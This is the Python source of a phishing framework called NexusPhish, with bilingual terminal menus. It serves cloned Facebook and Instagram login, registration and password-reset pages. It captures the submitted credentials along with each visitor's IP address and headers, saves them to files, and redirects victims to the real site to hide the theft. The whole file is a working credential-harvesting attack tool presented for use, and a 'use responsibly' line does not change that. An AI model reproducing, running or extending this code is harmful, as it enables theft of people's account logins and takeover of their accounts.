#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
import socket
import threading
import platform
import webbrowser
from urllib.parse import unquote
import time
import random
import hashlib

# ==================== CONFIGURAÇÃO DE CORES AVANÇADA ====================
class Cores:
    # Cores básicas
    PRETO = '\033[30m'
    VERMELHO = '\033[91m'
    VERDE = '\033[92m'
    AMARELO = '\033[93m'
    AZUL = '\033[94m'
    MAGENTA = '\033[95m'
    CIANO = '\033[96m'
    BRANCO = '\033[97m'
    RESET = '\033[0m'

    # Estilos
    NEGRITO = '\033[1m'
    SUBLINHADO = '\033[4m'
    REVERSO = '\033[7m'

    # Cores hacker (256 colors)
    HACKER_VERDE = '\033[38;5;118m'
    HACKER_CIANO = '\033[38;5;87m'
    HACKER_VERM = '\033[38;5;196m'
    HACKER_CINZA = '\033[38;5;240m'
    HACKER_AZUL = '\033[38;5;45m'

    # Cores de fundo
    BG_PRETO = '\033[40m'
    BG_VERMELHO = '\033[41m'
    BG_VERDE = '\033[42m'
    BG_AMARELO = '\033[43m'
    BG_AZUL = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CIANO = '\033[46m'
    BG_BRANCO = '\033[47m'

# ==================== ARQUIVO DE TRADUÇÕES ====================
translations = {
    "en": {
        "language_menu": "Select your language / Escolha seu idioma:",
        "language_option_1": "[1] English",
        "language_option_2": "[2] Português",
        "main_menu_title": "╔════════════════════════════════╗\n║       NEXUSPHISH MENU        ║\n╚════════════════════════════════╝",
        "exit_option": "[0] Exit",
        "back_option": "[0] Back",
        "select_target": "[>>] Select target: ",
        "select_module": "[>>] Select module: ",
        "invalid_option": "Invalid option",
        "server_running": "Server running at http://{}:{}",
        "active_module": "Active module: {} > {}",
        "press_enter_stop": "Press Enter to stop server...",
        "server_stopped": "Server stopped",
        "session_id": "Session ID: {}",
        "system_initialized": "System initialized",
        "use_responsibly": "Use responsibly and legally!",
        "exiting": "Exiting NexusPhish...",
        "invalid_target": "Invalid target selection",
        "invalid_module": "Invalid module selection"
    },
    "pt": {
        "language_menu": "Select your language / Escolha seu idioma:",
        "language_option_1": "[1] Inglês",
        "language_option_2": "[2] Português",
        "main_menu_title": "╔════════════════════════════════╗\n║       MENU NEXUSPHISH        ║\n╚════════════════════════════════╝",
        "exit_option": "[0] Sair",
        "back_option": "[0] Voltar",
        "select_target": "[>>] Selecione o alvo: ",
        "select_module": "[>>] Selecione o módulo: ",
        "invalid_option": "Opção inválida",
        "server_running": "Servidor rodando em http://{}:{}",
        "active_module": "Módulo ativo: {} > {}",
        "press_enter_stop": "Pressione Enter para parar o servidor...",
        "server_stopped": "Servidor parado",
        "session_id": "ID da sessão: {}",
        "system_initialized": "Sistema inicializado",
        "use_responsibly": "Use com responsabilidade e legalmente!",
        "exiting": "Saindo do NexusPhish...",
        "invalid_target": "Seleção de alvo inválida",
        "invalid_module": "Seleção de módulo inválida"
    }
}

# ========== Dicionário e módulos traduzidos ==========
target_translations = {
    "en": {
        "Facebook": "Facebook",
        "Instagram": "Instagram",
        "Google": "Google",
        "Microsoft": "Microsoft",
        "Exit": "Exit"
    },
    "pt": {
        "Facebook": "Facebook",
        "Instagram": "Instagram",
        "Google": "Google",
        "Microsoft": "Microsoft",
        "Exit": "Sair"
    }
}

module_translations = {
    "en": {
        "Classic Login": "Classic Login",
        "Security Check": "Security Check",
        "Promotional": "Promotional",
        "Standard Auth": "Standard Auth",
        "2FA Verification": "2FA Verification",
        "Giveaway": "Giveaway",
        "Gmail Login": "Gmail Login",
        "Account Recovery": "Account Recovery",
        "Office 365": "Office 365",
        "Security Update": "Security Update",
        "Back": "Back"
    },
    "pt": {
        "Classic Login": "Login Clássico",
        "Security Check": "Verificação de Segurança",
        "Promotional": "Promocional",
        "Standard Auth": "Autenticação Padrão",
        "2FA Verification": "Verificação em 2 Fatores",
        "Giveaway": "Sorteio",
        "Gmail Login": "Login do Gmail",
        "Account Recovery": "Recuperação de Conta",
        "Office 365": "Office 365",
        "Security Update": "Atualização de Segurança",
        "Back": "Voltar"
    }
}

# ==================== NEXUSPHISH BANNER ====================
class NexusCore:
    @staticmethod
    def show_banner():
        NexusLogger.show_loading()
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{Cores.HACKER_VERDE + Cores.NEGRITO}
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ██                                                                                        ██
   ██    ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗   ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗   ██
   ██    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝   ██╔══██╗██║  ██║██║██╔════╝██║  ██║   ██
   ██    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗   ██████╔╝███████║██║███████╗███████║   ██
   ██    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║   ██
   ██    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║   ██║     ██║  ██║██║███████║██║  ██║   ██
   ██    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝   ██
   ██                                                                                        ██
   ██    {Cores.HACKER_CIANO}╔══════════════════════════════════════════════════════════════════════╗    ██
   ██    {Cores.HACKER_CIANO}║{Cores.HACKER_VERDE}    The mistake was trusting the system... it was never on your side.  {Cores.HACKER_CIANO}║    ██
   ██    {Cores.HACKER_CIANO}║{Cores.HACKER_VERDE}                     Version 1.0 | By SeekerHacker Team                {Cores.HACKER_CIANO}║    ██
   ██    {Cores.HACKER_CIANO}╚══════════════════════════════════════════════════════════════════════╝    ██
   ██                                                                                        ██
   ██    {Cores.HACKER_CINZA}Session ID: {Config.SESSION_ID}{' '*(78-len(Config.SESSION_ID))}██
   ██                                                                                        ██
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
{Cores.RESET}""")

    @staticmethod
    def generate_id():
        """Gerar um ID único para cada sessão"""
        timestamp = str(time.time()).encode('utf-8')
        return hashlib.md5(timestamp).hexdigest()[:8].upper()

# ==================== NEXUSPHISH LOGGER ====================
class NexusLogger:
    @staticmethod
    def log(tipo, msg):
        lang = Config.LANGUAGE
        cores = {
            'info': Cores.HACKER_CIANO,
            'sucesso': Cores.HACKER_VERDE + Cores.NEGRITO,
            'alerta': Cores.HACKER_VERDE,
            'erro': Cores.HACKER_VERM,
            'destaque': Cores.HACKER_CIANO + Cores.NEGRITO,
            'input': Cores.HACKER_VERDE + Cores.SUBLINHADO,
            'debug': Cores.HACKER_CINZA,
            'titulo': Cores.HACKER_AZUL + Cores.NEGRITO
        }

        # ======= TRADUÇÃO DE MENSAGENS PADRÔES =======
        translated_msg = translations[lang].get(msg, msg)
        if '{}' in translated_msg:

            pass

        print(f"{cores.get(tipo, Cores.HACKER_CIANO)}[•] {translated_msg}{Cores.RESET}")

    @staticmethod
    def show_loading():
        """Efeito visual de loading"""
        animations = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]",
                     "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]",
                     "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
        for i in range(len(animations)):
            sys.stdout.write(f"\r{Cores.HACKER_VERDE}Loading {animations[i]}")
            sys.stdout.flush()
            time.sleep(0.1)
        print(Cores.RESET)

    @staticmethod
    def matrix_effect(lines=10):
        """Efeitos Matrix estilo"""
        chars = "01"
        for _ in range(lines):
            print(Cores.HACKER_VERDE + ''.join(random.choice(chars) for _ in range(80)))
            time.sleep(0.03)

# ==================== CONFIGURAÇÕES GLOBAIS ====================
class Config:
    TARGETS = {
        '1': {
            'name': 'Facebook',
            'modules': {
                '1': {'name': 'Login screen', 'template': 'face/facebook_login.html', 'domain': 'facebook.com'},
                '2': {'name': 'registration screen', 'template': 'face/facebook_registration.html', 'domain': 'facebook.com'},
                '3': {'name': 'reset password', 'template': 'face/facebook_reset _password.html', 'domain': 'facebook.com'}
            }
        },
        '2': {
            'name': 'Instagram',
            'modules': {
                '1': {'name': 'Login screen', 'template': 'insta/instagram_login.html', 'domain': 'instagram.com'},
                '2': {'name': 'registration screen', 'template': 'insta/instagram_registration.html', 'domain': 'instagram.com'},
                '3': {'name': 'Giveaway', 'template': 'insta/instagram_reset _password.html', 'domain': 'instagram.com'}
            }
        },
        '0': {'name': 'Exit'}
    }

    DATA_DIR = 'nexus_data'
    LOG_FILE = 'nexus.log'
    PORT = 8080
    SESSION_ID = NexusCore.generate_id()
    LANGUAGE = 'en'  # Idioma padrão

# ==================== GERENCIADOR DE IDIOMAS ====================
class LanguageManager:
    @staticmethod
    def select_language():
        """Mostra o menu de seleção de idioma"""
        print(f"\n{Cores.HACKER_AZUL + Cores.NEGRITO}╔════════════════════════════════╗")
        print(f"║   {Cores.HACKER_VERDE}SELECT LANGUAGE{Cores.HACKER_AZUL}   ║")
        print(f"╚════════════════════════════════╝{Cores.RESET}")

        print(f" {Cores.HACKER_CINZA}[{Cores.HACKER_VERDE}1{Cores.HACKER_CINZA}] {Cores.HACKER_CIANO}English{Cores.RESET}")
        print(f" {Cores.HACKER_CINZA}[{Cores.HACKER_VERDE}2{Cores.HACKER_CINZA}] {Cores.HACKER_CIANO}Português{Cores.RESET}")

        while True:
            choice = input(f"\n{Cores.HACKER_VERDE + Cores.SUBLINHADO}[>>] Select language: {Cores.RESET}").strip()
            if choice == '1':
                Config.LANGUAGE = 'en'
                break
            elif choice == '2':
                Config.LANGUAGE = 'pt'
                break
            else:
                print(f"{Cores.HACKER_VERM}Invalid option, try again.{Cores.RESET}")

# ==================== MÓDULO DE COLETA DE DADOS ====================
class DataCollector:
    @staticmethod
    def save_data(data, target):
        try:
            if not os.path.exists(Config.DATA_DIR):
                os.makedirs(Config.DATA_DIR)

            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{Config.SESSION_ID}_{target}_{timestamp}.json"
            filepath = os.path.join(Config.DATA_DIR, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)

            NexusLogger.log('sucesso', f"Data saved to {filepath}")
            return True
        except Exception as e:
            NexusLogger.log('erro', f"Failed to save data: {e}")
            return False

    @staticmethod
    def encrypt_data(data):
        """Criptografia para os dados coletados"""
        try:
            return hashlib.sha256(data.encode()).hexdigest()
        except:
            return data

# ==================== SERVIDOR HTTP ====================
class NexusHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suprime os logs padrão

    def do_GET(self):
        # Verifica se é um arquivo estático
        if self.path.startswith('/static/'):
            try:
                # Remove a barra inicial para obter o caminho relativo
                filepath = self.path[1:]  # Remove a primeira barra

                # Verifica se o arquivo existe
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        content = f.read()

                    # Determina o tipo MIME
                    if filepath.endswith('.png'):
                        mimetype = 'image/png'
                    elif filepath.endswith('.jpg') or filepath.endswith('.jpeg'):
                        mimetype = 'image/jpeg'
                    elif filepath.endswith('.css'):
                        mimetype = 'text/css'
                    elif filepath.endswith('.js'):
                        mimetype = 'application/javascript'
                    else:
                        mimetype = 'application/octet-stream'

                    self.send_response(200)
                    self.send_header('Content-type', mimetype)
                    self.end_headers()
                    self.wfile.write(content)
                else:
                    self.send_error(404, "File not found")

            except Exception as e:
                self.send_error(500, f"Internal Server Error: {str(e)}")

        # ServIR o template HTML normalmente
        elif hasattr(self.server, 'template'):
            try:
                with open(f'templates/{self.server.template}', 'r', encoding='utf-8') as f:
                    content = f.read()

                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(content.encode('utf-8'))

                client_ip = self.client_address[0]
                NexusLogger.log('info', f"GET request from {client_ip}")

            except Exception as e:
                NexusLogger.log('erro', f"Template error: {e}")
                self.send_error(500, "Internal Server Error")

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = unquote(self.rfile.read(content_length).decode('utf-8'))

            # Processar os dados
            collected_data = {
                'target': self.server.target,
                'module': self.server.module,
                'ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'timestamp': datetime.now().isoformat(),
                'data': self.parse_form_data(post_data),
                'headers': dict(self.headers)
            }

            # Salvar dados
            if DataCollector.save_data(collected_data, self.server.target):
                self.send_response(302)
                self.send_header('Location', f'https://{self.server.domain}')
                self.end_headers()

                NexusLogger.log('sucesso', f"Data collected from {self.client_address[0]}")

        except Exception as e:
            NexusLogger.log('erro', f"POST handling error: {e}")
            self.send_error(400, "Bad Request")

    def parse_form_data(self, raw_data):
        try:
            return dict(pair.split('=') for pair in raw_data.split('&'))
        except:
            return raw_data

# ==================== SERVIDOR ====================
class NexusServer(HTTPServer):
    def __init__(self, *args, **kwargs):
        self.target = kwargs.pop('target')
        self.module = kwargs.pop('module')
        self.template = kwargs.pop('template')
        self.domain = kwargs.pop('domain')
        super().__init__(*args, **kwargs)

# ==================== GERENCIADOR DE MENUS ====================
class MenuManager:
    @staticmethod
    def show_main_menu():
        lang = Config.LANGUAGE
        print(f"\n{Cores.HACKER_AZUL + Cores.NEGRITO}{translations[lang]['main_menu_title']}{Cores.RESET}")

        for code, target in Config.TARGETS.items():
            target_name = target_translations[lang].get(target['name'], target['name'])
            print(f" {Cores.HACKER_CINZA}[{Cores.HACKER_VERDE}{code}{Cores.HACKER_CINZA}] {Cores.HACKER_CIANO}{target_name}{Cores.RESET}")

        exit_text = translations[lang]['exit_option']
        print(f" {Cores.HACKER_CINZA}[{Cores.HACKER_VERM}0{Cores.HACKER_CINZA}] {Cores.HACKER_VERM}{exit_text}{Cores.RESET}\n")

    @staticmethod
    def show_module_menu(target_code):
        lang = Config.LANGUAGE
        if target_code not in Config.TARGETS:
            return None

        target = Config.TARGETS[target_code]
        print(f"\n{Cores.HACKER_AZUL + Cores.NEGRITO}╔════════════════════════════════╗")
        print(f"║   {Cores.HACKER_VERDE}{target['name'].upper()} MODULES{Cores.HACKER_AZUL}   ║")
        print(f"╚════════════════════════════════╝{Cores.RESET}")

        for code, module in target['modules'].items():
            module_name = module_translations[lang].get(module['name'], module['name'])
            print(f" {Cores.HACKER_CINZA}[{Cores.HACKER_VERDE}{code}{Cores.HACKER_CINZA}] {Cores.HACKER_CIANO}{module_name}{Cores.RESET}")

        back_text = translations[lang]['back_option']
        print(f" {Cores.HACKER_CINZA}[{Cores.HACKER_VERM}0{Cores.HACKER_CINZA}] {Cores.HACKER_VERM}{back_text}{Cores.RESET}\n")
        return target['modules']

# ==================== CONTROLE PRINCIPAL ====================
class NexusController:
    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            NexusLogger.log('erro', f"IP detection failed: {e}")
            return "127.0.0.1"

    @staticmethod
    def start_server(target, module, template, domain):
        try:
            server = NexusServer(
                ('0.0.0.0', Config.PORT),
                NexusHandler,
                target=target,
                module=module,
                template=template,
                domain=domain
            )

            local_ip = NexusController.get_local_ip()
            lang = Config.LANGUAGE
            NexusLogger.log('sucesso', translations[lang]['server_running'].format(local_ip, Config.PORT))
            NexusLogger.log('info', translations[lang]['active_module'].format(target, module))

            # Iniciar em thread separada
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()

            # Abrir no navegador se for localhost
            if local_ip == "127.0.0.1":
                webbrowser.open(f'http://localhost:{Config.PORT}')

            input(f"\n{translations[lang]['press_enter_stop']}\n")
            server.shutdown()
            NexusLogger.log('info', translations[lang]['server_stopped'])

        except Exception as e:
            NexusLogger.log('erro', f"Server error: {e}")
            sys.exit(1)

# ==================== FUNÇÃO PRINCIPAL ====================
def main():
    # Mostrar primeiro o menu de para selecionar o idioma
    LanguageManager.select_language()

    parser = argparse.ArgumentParser(description='NexusPhish - Advanced Phishing Framework')
    parser.add_argument('-t', '--target', help='Target platform code')
    parser.add_argument('-m', '--module', help='Module code')
    parser.add_argument('-p', '--port', type=int, help='Custom port')
    args = parser.parse_args()

    # Mostrar banner
    NexusCore.show_banner()
    NexusLogger.matrix_effect(5)

    # Configurações iniciais
    if args.port:
        Config.PORT = args.port

    lang = Config.LANGUAGE
    NexusLogger.log('info', translations[lang]['session_id'].format(Config.SESSION_ID))
    NexusLogger.log('sucesso', translations[lang]['system_initialized'])
    NexusLogger.log('alerta', translations[lang]['use_responsibly'])

    # Modo direto com argumentos
    if args.target and args.module:
        if args.target in Config.TARGETS and args.module in Config.TARGETS[args.target]['modules']:
            module = Config.TARGETS[args.target]['modules'][args.module]
            NexusController.start_server(
                Config.TARGETS[args.target]['name'],
                module['name'],
                module['template'],
                module['domain']
            )
        else:
            NexusLogger.log('erro', translations[lang]['invalid_option'])
            sys.exit(1)

    # Modo interativo
    else:
        while True:
            MenuManager.show_main_menu()
            lang = Config.LANGUAGE
            choice = input(f"{Cores.HACKER_VERDE + Cores.SUBLINHADO}{translations[lang]['select_target']}{Cores.RESET}").strip()

            if choice == '0':
                NexusLogger.log('info', translations[lang]['exiting'])
                break

            elif choice in Config.TARGETS:
                while True:
                    modules = MenuManager.show_module_menu(choice)
                    if not modules:
                        break

                    mod_choice = input(f"{Cores.HACKER_VERDE + Cores.SUBLINHADO}{translations[lang]['select_module']}{Cores.RESET}").strip()

                    if mod_choice == '0':
                        break

                    elif mod_choice in modules:
                        module = modules[mod_choice]
                        NexusController.start_server(
                            Config.TARGETS[choice]['name'],
                            module['name'],
                            module['template'],
                            module['domain']
                        )
                    else:
                        NexusLogger.log('alerta', translations[lang]['invalid_module'])
            else:
                NexusLogger.log('alerta', translations[lang]['invalid_target'])

if __name__ == '__main__':
    try:
        # Verificar ambientes
        if 'com.termux' in os.environ.get('PREFIX', ''):
            NexusLogger.log('info', "Termux environment detected")
        elif platform.system() == 'Linux' and 'kali' in platform.release().lower():
            NexusLogger.log('info', "Kali Linux environment detected")

        main()
    except KeyboardInterrupt:
        NexusLogger.log('erro', "\nSession terminated by user")
        sys.exit(0)
